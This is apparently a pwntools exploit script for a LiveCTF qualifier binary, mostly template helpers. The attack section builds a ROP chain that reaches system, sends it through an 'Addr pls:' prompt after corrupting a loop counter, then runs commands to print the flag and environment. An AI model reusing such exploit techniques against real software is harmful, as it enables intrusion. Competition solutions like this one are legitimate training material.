#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ vagd template ./handout/challenge localhost 31337 -e --libs --image=livectf/livectf:quals-nsjail
from pwn import *


GOFF   = 0x555555554000                               # GDB default base address
IP     = os.environ.get('HOST', 'localhost')          # remote IP
PORT   = 31337                                        # remote PORT
BINARY = './handout/challenge'                        # PATH to local binary
ARGS   = []                                           # ARGS supplied to binary
ENV    = {}                                           # ENV supplied to binary
BOX    = 'livectf/livectf:quals-nsjail'               # Docker box image

# GDB SCRIPT, executed at start of GDB session (e.g. set breakpoints here)
GDB    = f"""
set follow-fork-mode parent

c"""

# context.binary = exe = ELF(BINARY, checksec=False)  # binary
context.arch = 'amd64'                                # architecture
context.aslr = False                                  # ASLR enabled (only GDB)

# abbreviations
cst = constants
shc = shellcraft

# logging
linfo = lambda x, *a: log.info(x, *a)
lwarn = lambda x, *a: log.warn(x, *a)
lerr  = lambda x, *a: log.error(x, *a)
lprog = lambda x, *a: log.progress(x, *a)
lhex  = lambda x, y="leak": linfo(f"{x:#016x} <- {y}")
phex  = lambda x, y="leak": print(f"{x:#016x} <- {y}")

# type manipulation
byt   = lambda x: x if isinstance(x, (bytes, bytearray)) else f"{x}".encode()
rpad  = lambda x, s=8, v=b"\0": x.ljust(s, v)
lpad  = lambda x, s=8, v=b"\0": x.rjust(s, v)
hpad  = lambda x, s=0: f"%0{s if s else ((x.bit_length() // 8) + 1) * 2}x" % x
upad  = lambda x: u64(rpad(x))
cpad  = lambda x, s: byt(x) + cyc(s)[len(byt(x)):]
tob   = lambda x: bytes.fromhex(hpad(x))

# elf aliases
gelf  = lambda elf=None: elf if elf else exe
srh   = lambda x, elf=None: gelf(elf).search(byt(x)).__next__()
sasm  = lambda x, elf=None: gelf(elf).search(asm(x), executable=True).__next__()
lsrh  = lambda x: srh(x, libc)
lasm  = lambda x: sasm(x, libc)

# cyclic aliases
cyc = lambda x: cyclic(x)
cfd = lambda x: cyclic_find(x)
cto = lambda x: cyc(cfd(x))

# tube aliases
t   = None
gt  = lambda at=None: at if at else t
sl  = lambda x, t=None, *a, **kw: gt(t).sendline(byt(x), *a, **kw)
se  = lambda x, t=None, *a, **kw: gt(t).send(byt(x), *a, **kw)
ss  = (
        lambda x, s, t=None, *a, **kw: sl(x, t, *a, **kw)
        if len(x) < s
        else se(x, *a, **kw)
          if len(x) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
sla = lambda x, y, t=None, *a, **kw: gt(t).sendlineafter(
        byt(x), byt(y), *a, **kw
      )
sa  = lambda x, y, t=None, *a, **kw: gt(t).sendafter(byt(x), byt(y), *a, **kw)
sas = (
        lambda x, y, s, t=None, *a, **kw: sla(x, y, t, *a, **kw)
        if len(y) < s
        else sa(x, y, *a, **kw)
          if len(y) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
ra  = lambda t=None, *a, **kw: gt(t).recvall(*a, **kw)
rl  = lambda t=None, *a, **kw: gt(t).recvline(*a, **kw)
rls = lambda t=None, *a, **kw: rl(t=t, *a, **kw)[:-1]
rcv = lambda x, t=None, *a, **kw: gt(t).recv(x, *a, **kw)
ru  = lambda x, t=None, *a, **kw: gt(t).recvuntil(byt(x), *a, **kw)
it  = lambda t=None, *a, **kw: gt(t).interactive(*a, **kw)
cl  = lambda t=None, *a, **kw: gt(t).close(*a, **kw)


# setup vagd vm
vm = None
def setup():
  global vm
  if args.REMOTE or args.LOCAL:
    return None

  try:
    # only load vagd if needed
    from vagd import Dogd, Box
  except ModuleNotFoundError:
    log.error('Failed to import vagd, run LOCAL/REMOTE or install it')
  if not vm:
    vm = Dogd(BINARY, image=BOX, symbols=True, libs=True, ex=True, fast=True)  # Docker
  if vm.is_new:
    # additional setup here
    log.info('new vagd instance')

  return vm


# get target (pwnlib.tubes.tube)
def get_target(**kw):
  if args.REMOTE:
    # context.log_level = 'debug'
    return remote(IP, PORT)

  if args.LOCAL:
    if args.GDB:
      return gdb.debug([BINARY] + ARGS, env=ENV, gdbscript=GDB, **kw)
    return process([BINARY] + ARGS, env=ENV, **kw)

  return vm.start(argv=ARGS, env=ENV, gdbscript=GDB, **kw)


vm = setup()

#===========================================================
#                   EXPLOIT STARTS HERE
#===========================================================
# Arch:       amd64-64-little
# RELRO:      No RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes
# Comment:    GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0

ROP = [469514]*0x20 + [495542] * 0x2e + [
    488956, # pop rbp; ret
    6873,
    401917, # system
]

t = get_target()

def snd(o):
  sla('Addr pls:', o)

p = lprog("iter")
for i in range(0x3e7):
  p.status(f"{i}")
  # corrupt i
  if i == 3: 
    snd(400000000)
  elif i == len(ROP) + 4:
    snd('0')
    break
  elif i >= 4:
    snd(ROP[i - 4])
  else:
    snd(i + 1)

p.status("done")

sleep(1)
sl(b'cat /flag*; ./submitter; env; echo asdfasdfasdf')
print(ru(b'asdfasdfasdf'))
cl()
